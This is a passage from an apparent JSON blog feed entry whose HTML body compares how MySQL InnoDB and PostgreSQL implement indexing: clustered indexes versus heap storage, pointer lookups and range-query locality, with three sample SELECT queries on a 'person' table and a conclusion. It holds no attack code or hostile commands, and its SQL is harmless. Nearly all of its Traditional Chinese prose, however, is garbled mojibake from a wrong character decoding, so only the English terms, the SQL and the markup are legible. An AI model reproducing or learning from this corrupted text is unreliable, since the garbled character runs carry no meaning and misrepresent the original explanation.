çš„æŒ‡æ¨™ï¼Œè€Œæ˜¯ç”¨ä¾†åœ¨è³‡æ–™åº«ä¸­æ¨™è¨˜å”¯ä¸€æ‰€åœ¨ä½ç½®çš„ <a href=\"https://www.postgresql.org/docs/8.0/storage-page-layout.html\">Page</a> çš„è³‡è¨Š) *</p>\n<p><img src=\"/img/posts/max/IndexingComparisonOfMySQLAndPostgres/0__y9JhQLyEkTuIgTJQ.png\" alt=\"\"></p>\n<blockquote>\n<p>çœ‹åˆ°é€™è£¡å¯èƒ½æœƒæœ‰äººæƒ³å•,â€œé‚£ç‚ºä½• MySQLä¸ä¹Ÿç›´æ¥åœ¨ Non-clustered index treeçš„ node ä¸­å­˜æ”¾æŒ‡æ¨™å°±å¥½äº†ï¼Ÿ</p>\n</blockquote>\n<p>é€™é»ä¹Ÿæ­£æ˜¯ PostgreSQL ä»¥ Heap å­˜æ”¾åŸå§‹å®Œæ•´è³‡æ–™çš„ä¸»è¦åŸå› . å› ç‚º Heap ä¸ä¿è­‰è³‡æ–™é †åº,æ‰€ä»¥ä»»ä½•è³‡æ–™è¢« update æˆ– insert ï¼Œç¾æœ‰çš„å…¶ä»–è³‡æ–™éƒ½ä¸éœ€è¦è®Šæ›´å­˜æ”¾çš„ä½ç½®, ç›¸è¼ƒä¹‹ä¸‹ Innodb å› ç‚ºæ˜¯ä¾ç…§ clustered index ä¾†æ’åº,ä»»ä½•è³‡æ–™çš„ clustered index è¢«æ›´æ”¹æˆ–æ’å…¥æ–°çš„è³‡æ–™éƒ½æœƒé€ æˆå…¶ä»–è³‡æ–™çš„å­˜æ”¾ä½ç½®ä¾ç…§index ç™¼ç”Ÿç›¸å°æ‡‰çš„è®ŠåŒ–ã€‚<br>\nï¼ˆä»¥ B-Tree ä¾†èªª, æœƒç‚ºäº†ç¶­æŒ tree çš„ balance è€Œç™¼ç”Ÿæ¨¹çš„çµæ§‹çš„è®ŠåŒ–ï¼Œå› ç‚ºclustered index å¿…é ˆåæ˜ å¯¦éš›ç‰©ç†ä½ç½®ï¼Œæ‰€ä»¥ clustered index é †åºæ›´æ–°å¿…é ˆåŒæ™‚æ›´æ–° disk ä¸­çš„è³‡æ–™ä½ç½®, é€ æˆå¤§é‡çš„æ™‚é–“æ¶ˆè€—ï¼‰</p>\n<p><img src=\"/img/posts/max/IndexingComparisonOfMySQLAndPostgres/0__fHXzicHiDkxS1uTE.png\" alt=\"\"></p>\n<p>æ­£æ˜¯å› ç‚ºè³‡æ–™ä½ç½®çš„ä¸è®Šçš„ç‰¹æ€§ï¼Œè®“ PostgreSQL çš„æŒ‡æ¨™å¯¦ç¾æˆç‚ºå¯èƒ½ã€‚æ‰€ä»¥åœ¨PostgreSQL ä¸­ï¼Œç”¨ Non-clustered index æŸ¥è©¢è³‡æ–™ï¼Œä¸éœ€è¦å†è·‘å» clustered index tree è£¡é¢æŸ¥è©¢ï¼Œç›´æ¥æ‹¿æŒ‡æ¨™ä½ç½®å» storage è£¡é¢å°æ‡‰çš„ Page å–å‡ºè³‡æ–™å³å¯ã€‚</p>\n<p>ç„¶è€Œé€™æ¨£çš„è¨­è¨ˆä¸¦éæ²’æœ‰ Trade-Off çš„ã€‚</p>\n<p>å„˜ç®¡åœ¨ç”¨ Non-clustered Index é€²è¡Œ <strong>SELECT *</strong> ä¹‹é¡çš„æŸ¥è©¢æ™‚æœƒå› ç‚ºå°‘ä¸€æ¬¡tree lookup è€Œæœ‰æ•ˆç‡ä¸Šçš„æå‡ã€‚ä½†å› ç‚ºé€™ç¨®å¯¦ç¾æ–¹å¼å®Œå…¨æ¨æ£„äº† clustered-indexï¼Œæ‰€ä»¥å¦‚æœæ˜¯ç”¨ primary keyï¼ˆä»¥Innodb ä¾†èªªå°±æ˜¯ clustered index ï¼‰ ä¾†æŸ¥è©¢ï¼Œ åè€Œæœƒå¤šäº†ä¸€å€‹ç”¨æŒ‡æ¨™æŸ¥è©¢çš„æ­¥é©Ÿã€‚</p>\n<p>ä¸”å› ç‚º Heap æ²’æœ‰è¾¦æ³•ä¿è­‰ä»»ä½•è³‡æ–™åœ¨ç‰©ç†ä¸Šçš„ Localityï¼ˆåœ¨å‰é¢æé, clustered index æ‰æœ‰è¾¦æ³•ä¿è­‰ index è·Ÿ storage ä¸­ç‰©ç†ä½ç½®çš„ç›¸ä¼¼æ€§ï¼‰ï¼Œæ‰€ä»¥ç„¡æ³•åƒ MySQL-Innodb ä¸€æ¨£ä»¥ clustered-index é€²è¡Œ Range Query æ™‚æœ‰Localityçš„å„ªå‹¢ã€‚</p>\n<p>ç¶œä¸Šæ‰€è¿°ï¼Œæˆ‘å€‘å¤§è‡´å¯ä»¥æŠŠé€™å…©ç¨®è³‡æ–™åº«å¯¦ç¾Indexingçš„æ–¹å¼ç”¨ä»¥ä¸‹å¹¾é»æ­¸ç´ï¼š</p>\n<p><img src=\"/img/posts/max/IndexingComparisonOfMySQLAndPostgres/0__ZXKx4__FyY7rop1wV.png\" alt=\"\"></p>\n<p>ä»¥å‰›å‰›åŒ…å«äº† idã€ Name è·Ÿ Height çš„ table (person) ç‚ºä¾‹ ï¼šï¼ˆç•¶ç„¶ä»¥ä¸‹çš„å‰æéƒ½æ˜¯è³‡æ–™çš„ rows éå¸¸éå¸¸å¤šçš„ç‹€æ³ï¼Œä¸”æˆ‘å€‘æŠŠ idã€Nameã€ Height éƒ½ create Indexï¼‰</p>\n<p>SELECT p.*<br>\nFROM person p<br>\nWHERE p.Height &lt; 170;</p>\n<p>å°é€™æ¨£çš„æŒ‡ä»¤ä¾†èªªï¼Œ å› ç‚ºè¦ Select å…¨éƒ¨çš„æ¬„ä½ï¼Œ è€ŒæŸ¥è©¢æ¢ä»¶æ˜¯ non-clustered index, æ‰€ä»¥æ ¹æ“šæˆ‘å€‘å‰é¢æ‰€èªªï¼Œå› ç‚º MySQL-Innodb é‚„å¿…é ˆå» clustered index tree è£¡é¢æœå°‹ä¸€éï¼Œæ˜¯å¯ä»¥é æœŸ PostgreSQL æ˜¯æ¯”è¼ƒå¿«çš„ã€‚</p>\n<p>SELECT p.*<br>\nFROM person p<br>\nWHERE <a href=\"http://p.id\">p.id</a> &gt; 18;</p>\n<p>é€™å€‹æŒ‡ä»¤ï¼Œå„˜ç®¡è¦ Select å…¨éƒ¨çš„æ¬„ä½,ä½†å› ç‚º id æ˜¯ clustered indexï¼Œ ç”¨idä¾†ç•¶ä½œæŸ¥è©¢æ¢ä»¶æ™‚å° Innodb ä¾†èªªå°±ç›´æ¥åœ¨ clusterd index tree è£¡é¢æœå°‹äº†ï¼Œæ‰¾åˆ°å°±å¯ç›´æ¥å›å‚³ã€‚è€Œå° PostgreSQL ä¾†èªªå› ç‚ºidä»ç„¶æ˜¯ non-clusterd index (è·Ÿ Heap åˆ†é–‹çš„)ï¼Œ æ‰€ä»¥ PostgreSQL åè€Œé‚„æœƒå¤šäº†ä¸€æ¬¡ç”¨æŒ‡æ¨™å»è³‡æ–™åº«æŠŠè³‡æ–™æ’ˆå‡ºä¾†çš„æ­¥é©Ÿã€‚ å› æ­¤é€™æ¨£çš„æ“ä½œæ˜¯å¯ä»¥é æœŸ MySQL æ˜¯æœ‰å„ªå‹¢çš„ã€‚</p>\n<p>SELECT <a href=\"http://p.Name\">p.Name</a><br>\nFROM person p<br>\nWHERE <a href=\"http://p.Name\">p.Name</a> = &quot;David&quot;;</p>\n<p>è‡³æ–¼é€™å€‹æŒ‡ä»¤ï¼Œå› ç‚ºè¦å›å‚³çš„ column å°±æ˜¯ non-clustered indexï¼Œæ‰€ä»¥ä¸è«–æ˜¯Innodb é‚„æ˜¯ PostgreSQL éƒ½åªè¦åœ¨æŸ¥è©¢ non-clustered index tree æ™‚ç›´æ¥å›å‚³Name å°±å¥½äº†ï¼Œ è·Ÿ Clustered Index tree å’Œ Heap éƒ½æ²’é—œä¿‚ï¼Œæ‰€ä»¥å…©è€…çš„è³‡æ–™å„²å­˜æ–¹å¼ä¸åŒä¸æœƒè®“é€™æ¨£çš„æŸ¥è©¢æœ‰å¤ªå¤§æ•ˆèƒ½å·®ç•°ã€‚</p>\n<h4 id=\"%E7%B5%90%E8%AB%96-%3A\"><a class=\"direct-link\" href=\"#%E7%B5%90%E8%AB%96-%3A\">#</a> çµè«–Â :</h4>\n<p>ä¸€èˆ¬ä¾†èªªå¦‚æœç”¨ Primary Key ä¾†æŸ¥è©¢æ™‚ï¼Œå› ç‚º MySQL-Innodb æ˜¯ç”¨ Clustered-indexï¼Œ æ‰€ä»¥é€Ÿåº¦è¼ƒå¿«ï¼Œå°¤å…¶åœ¨é€²è¡Œ Range Query æ™‚å› ç‚º clustered-indexåœ¨Storage ä¸­çš„ localityï¼Œæ‰€ä»¥é€Ÿåº¦æœƒå¤§å¹…æå‡ã€‚</p>\n<p>è€Œå¦‚æœæ˜¯éœ€è¦ç¶“å¸¸å°ä¸åŒæ¬„ä½é€²è¡Œæª¢ç´¢çš„ Tableï¼Œ å› ç‚º PostgreSQL åœ¨ non-clustered index çš„è³‡æ–™çµæ§‹çš„ç¯€é»ä¸­æœ‰ç›´æ¥å­˜æ”¾å¯¦éš›è³‡æ–™çš„ä½ç½®ï¼Œæ‰€ä»¥é€Ÿåº¦æœƒæ¯”èµ·è¦å†æ¬¡å» clustered index è³‡æ–™çµæ§‹æŸ¥è©¢çš„ MySQL-Innodbä¾†çš„å¿«ã€‚</p>\n<p>å¦å¤–ï¼Œç•¶è¦ select çš„æ¬„ä½å…¨éƒ¨éƒ½è¢« include åœ¨ non-clustered index çš„è³‡æ–™çµæ§‹ä¸­æ™‚ï¼Œç†è«–ä¸Šå…©è€…çš„æ•ˆç‡ä¾¿ä¸æœƒæœ‰å¤ªå¤§çš„å·®åˆ¥ã€‚ï¼ˆä¸éï¼Œ INCLUDE clauseåªæ”¯æ´ PostgreSQL11 ä»¥å¾Œçš„ç‰ˆæœ¬ï¼Œå› æ­¤å¦‚æœ PostgreSQL æ²’æœ‰ INCLUDE çš„è©±Innodb é‚„æ˜¯æœƒå¿«ä¸€äº›çš„ï¼‰</p>\n",
      "date_published": "2021-03-12T08:00:00+08:00"
    }
  ]
}
